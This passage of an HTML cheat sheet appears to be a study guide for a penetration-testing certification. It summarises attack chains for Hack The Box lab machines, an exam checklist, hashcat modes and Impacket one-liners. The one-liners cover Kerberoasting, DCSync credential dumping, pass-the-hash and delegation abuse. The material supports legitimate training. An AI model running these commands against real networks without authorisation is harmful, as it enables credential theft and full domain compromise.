+          <div class="card-head"><div><h3>Active Directory / Windows</h3><div class="desc">18 machines</div></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># AS-REP → DCSync chain</span>
+<b>forest</b>         — LDAP enum → AS-REP roast svc-alfresco → Exchange perms → DCSync → Administrator
+<b>administrator</b> — SMB/SNMP → password spray → Kerberoast → ACL abuse → DCSync → PTH
+<b>vintage</b>       — web → certipy ESC1 → ADCS → impersonate DA → DCSync
+<b>tombwatcher</b>   — LDAP → Kerberoast → RBCD → impersonate Administrator
+<b>authority</b>     — SMB → LDAP → SCCM NAA dump → site server takeover → fleet-wide SYSTEM
+<b>manager</b>       — web LFI → web.config → MSSQL → xp_cmdshell → DCSync
+<b>ghost</b>         — web app → ESC4 → ESC1 → PFX → DA
+<b>redelegate</b>    — web → Kerb delegation (S4U2Self/Proxy) → impersonate DA
+<b>vulncicada</b>    — vuln exploit → Kerberoast → constrained delegation
+<b>media</b>         — SSRF → Kerberoast → PTH
+<b>whiterabbit</b>   — web → ADCS ESC8 → DCSync → DPAPI
+<b>fluffy</b>        — SMB → LDAP → GPO abuse → push malicious GPO → SYSTEM
+<b>snoopy</b>        — DNS zone transfer → Responder → Kerberoast → unconstrained delegation
+<b>streamio</b>      — SQLi → xp_cmdshell → MSSQL user → PowerShell history → DA
+<b>jeeves</b>        — SMB share → KeePass → oxcf → Kerberoast → SeImpersonate → PTH
+<b>pov</b>           — web auth bypass → file upload → SeImpersonate → DPAPI
+<b>hospital</b>      — webmail → Ghostscript RCE → Linux shell → pivot → Windows AD
+<b>outdated</b>      — SNMP → MSExchange CVE → Kerberoast → ACL → DA
+<b>sekhmet</b>       — web → Kerberos → ADCS → DA</pre>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Linux / Hybrid</h3><div class="desc">5 machines</div></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><b>trick</b>     — vhost enum → SSRF → nginx path traversal → sudo abuse
+<b>postman</b>  — Redis misconfig → SSH key inject → webmin CVE → root
+<b>craft</b>    — Flask debug → API token → Vault → root
+<b>voleur</b>   — Linux misconfig chain (recent box)</pre>
+          </div>
+        </div>
+      </section>
+
+      <!-- CHECKLIST -->
+      <section class="section" id="checklist">
+        <div class="section-header"><h2>★ CPTS Exam Checklist</h2><span class="tagline">Work this list top to bottom on every host</span></div>
+
+        <div class="card open">
+          <div class="card-head"><div><h3>Day-1 / Day-2 Routine</h3></div></div>
+          <div class="card-body">
+            <div class="step"><span class="step-num">1</span><span class="step-title">Recon</span>
+              <div class="step-detail">☑ Full TCP + top UDP nmap<br>☑ Add hostnames to /etc/hosts<br>☑ Service-specific enum (SMB/LDAP/Web/DNS/SNMP)<br>☑ Identify AD domain name</div>
+            </div>
+            <div class="step"><span class="step-num">2</span><span class="step-title">AD Graph</span>
+              <div class="step-detail">☑ Run bloodhound-python with ANY creds<br>☑ Run all built-in queries<br>☑ Identify shortest path to DA</div>
+            </div>
+            <div class="step"><span class="step-num">3</span><span class="step-title">Initial Access</span>
+              <div class="step-detail">☑ Password spray with seasonal passwords<br>☑ AS-REP roast every user<br>☑ Kerberoast every SPN<br>☑ ADCS enum with certipy<br>☑ SQLi / LFI / SSRF / file upload on web apps</div>
+            </div>
+            <div class="step"><span class="step-num">4</span><span class="step-title">Post-Foothold</span>
+              <div class="step-detail">☑ WinPEAS / manual enum<br>☑ <code class="inline">whoami /priv</code> — check SeImpersonate<br>☑ Dump LSASS<br>☑ Read PowerShell history, web configs, browser vaults<br>☑ Search for KeePass DBs, .kdbx files</div>
+            </div>
+            <div class="step"><span class="step-num">5</span><span class="step-title">Credential Reuse</span>
+              <div class="step-detail">☑ Spray all found creds across SMB/WinRM/MSSQL<br>☑ Use CME with <code class="inline">--continue-on-success</code><br>☑ Check (Pwn3d!) flag for local admin</div>
+            </div>
+            <div class="step"><span class="step-num">6</span><span class="step-title">Lateral Movement</span>
+              <div class="step-detail">☑ Identify pivot targets via BloodHound<br>☑ Set up ligolo-ng or chisel<br>☑ Move via PSExec/WMI/WinRM<br>☑ Repeat phase 1 on new subnet</div>
+            </div>
+            <div class="step"><span class="step-num">7</span><span class="step-title">Domain Compromise</span>
+              <div class="step-detail">☑ DCSync once DA<br>☑ Dump NTDS.dit<br>☑ Dump krbtgt for golden ticket (persistence)<br>☑ Crack all hashes with hashcat<br>☑ Document every step with screenshots</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Common Pitfalls</h3></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <div class="warn-note">✗ Forgetting to add hostname to /etc/hosts → Kerberos fails<br>✗ Skipping UDP scan → miss SNMP (goldmine on Outdated/Snoopy)<br>✗ Running BloodHound only once — re-run after each escalation<br>✗ Locking out accounts via aggressive password spraying<br>✗ Forgetting to crack ALL hashes with rules<br>✗ Not pivoting deep enough — exam rewards full compromise of all subnets<br>✗ Not documenting while you go — exam requires detailed report</div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Hashcat Mode Cheatsheet</h3></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="arg">-m 0</span>      MD5
+<span class="arg">-m 100</span>    SHA1
+<span class="arg">-m 1000</span>   NTLM                          <span class="cmt"># most common in AD</span>
+<span class="arg">-m 1800</span>   sha512crypt ($6$)             <span class="cmt"># Linux /etc/shadow</span>
+<span class="arg">-m 18200</span>  AS-REP Roast                  <span class="cmt"># mode 18200</span>
+<span class="arg">-m 13100</span>  Kerberoast TGS-RC4
+<span class="arg">-m 19700</span>  Kerberoast TGS-AES256
+<span class="arg">-m 19600</span>  Kerberoast TGS-AES128
+<span class="arg">-m 1962</span>   KeePass                       <span class="cmt"># .kdbx</span>
+<span class="arg">-m 13400</span>  KeePass 1.x AES
+<span class="cmt"># Always run with rules</span>
+<span class="cmd">hashcat</span> <span class="arg">-m MODE hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force</span></pre>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head"><div><h3>Impacket One-Liners</h3></div><span class="chev">▸</span></div>
+          <div class="card-body">
+            <pre><button class="copy-btn">copy</button><span class="cmt"># All-in-one AD attack toolkit</span>
+<span class="cmd">GetNPUsers.py</span>        DOMAIN/ -no-pass -usersfile users.txt -dc-ip DC -format hashcat
+<span class="cmd">GetUserSPNs.py</span>       DOMAIN/user:pass -dc-ip DC -request
+<span class="cmd">findDelegation.py</span>    DOMAIN/user:pass -dc-ip DC
+<span class="cmd">secretsdump.py</span>       DOMAIN/user:pass@DC -just-dc-ntlm
+<span class="cmd">psexec.py</span>            -hashes :HASH DOMAIN/user@TARGET
+<span class="cmd">wmiexec.py</span>           -hashes :HASH DOMAIN/user@TARGET
+<span class="cmd">getST.py</span>             -spn cifs/TARGET -impersonate Administrator DOMAIN/user:pass
+<span class="cmd">addcomputer.py</span>       -computer-name 'EVIL$' -computer-pass 'P@ss' DOMAIN/user:pass
+<span class="cmd">rbcd.py</span>              -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write DOMAIN/user:pass
+<span class="cmd">certipy find</span>         -u user@DOMAIN -p pass -dc-ip DC -vulnerable</pre>
+          </div>
+        </div>
+      </section>
+
+    </div>
+
+    <footer>
+      CPTS Ultimate Playbook · Compiled from 23 HTB walkthroughs (0xdf.gitlab.io) · For exam preparation only.<br>
+      Built as a single-file HTML reference. Search ↑ or use the sidebar to navigate.
+    </footer>
+  </main>
+</div>
+
+<script>
+  // Toggle cards
+  document.querySelectorAll('.card-head').forEach(h=>{
+    h.addEventListener('click',e=>{
+      if(e.target.tagName==='BUTTON')return;
+      h.parentElement.classList.toggle('open');
+    });
+  });
+
+  // Sidebar nav
+  document.querySelectorAll('.side-link').forEach(a=>{
+    a.addEventListener('click',e=>{
+      e.preventDefault();
+      const id=a.dataset.nav;
+      const el=document.getElementById(id);
+      if(el){
+        el.scrollIntoView({behavior:'smooth',block:'start'});
+        // open all cards in this section
+        el.querySelectorAll('.card').forEach(c=>c.classList.add('open'));
+      }
+      document.querySelectorAll('.side-link').forEach(x=>x.classList.remove('active'));
+      a.classList.add('active');
+      // close mobile sidebar
+      document.getElementById('sidebar').classList.remove('open');
+    });
+  });
+
+  // Search
+  const search=document.getElementById('search');
+  search.addEventListener('input',()=>{
+    const q=search.value.toLowerCase().trim();
+    if(!q){
+      document.querySelectorAll('.section, .card').forEach(el=>el.classList.remove('hide'));
+      return;
+    }
+    document.querySelectorAll('.section').forEach(sec=>{
+      let anyVisible=false;
+      sec.querySelectorAll('.card').forEach(card=>{
+        const txt=card.innerText.toLowerCase();
+        const match=txt.includes(q);
+        card.classList.toggle('hide',!match);
+        if(match){card.classList.add('open');anyVisible=true;}
+      });
+      // also hide/show tools grid items
+      sec.querySelectorAll('.tool').forEach(t=>{
+        const match=t.innerText.toLowerCase().includes(q);
+        t.classList.toggle('hide',!match);
+        if(match)anyVisible=true;
+      });
+      sec.classList.toggle('hide',!anyVisible);
+    });
+  });
+
+  // Filter chips
+  document.querySelectorAll('.chip').forEach(c=>{
+    c.addEventListener('click',()=>{
+      document.querySelectorAll('.chip').forEach(x=>x.classList.remove('active'));
+      c.classList.add('active');
+      const f=c.dataset.filter;
+      document.querySelectorAll('.card').forEach(card=>{
+        const text=card.innerText.toLowerCase();
+        let show=true;
+        if(f==='windows')show=text.includes('forest')||text.includes('authority')||text.includes('administrator')||text.includes('streamio')||text.includes('pov')||text.includes('jeeves')||text.includes('hospital')||text.includes('vintage');
+        else if(f==='linux')show=text.includes('trick')||text.includes('postman')||text.includes('craft');
+        else if(f==='ad')show=text.includes('kerberoast')||text.includes('dcsync')||text.includes('adcs')||text.includes('delegation')||text.includes('bloodhound');
+        card.classList.toggle('hide',!show);
+      });
+    });
+  });
+
+  // Copy buttons
+  document.querySelectorAll('.copy-btn').forEach(b=>{
+    b.addEventListener('click',e=>{
+      e.stopPropagation();
+      const pre=b.parentElement;
+      const text=pre.innerText.replace('copy\n','').trim();
+      navigator.clipboard.writeText(text).then(()=>{
+        b.textContent='✓ copied';
+        setTimeout(()=>b.textContent='copy',1500);
+      });
+    });
+  });
+
+  // Highlight active section on scroll
+  const sections=document.querySelectorAll('.section');
+  const links=document.querySelectorAll('.side-link');
+  window.addEventListener('scroll',()=>{
+    let current='';
+    sections.forEach(sec=>{
+      if(window.scrollY>=sec.offsetTop-100)current=sec.id;
+    });
+    links.forEach(l=>{
+      l.classList.toggle('active',l.dataset.nav===current);
+    });
+  });
+</script>
+
+</body>
+</html>
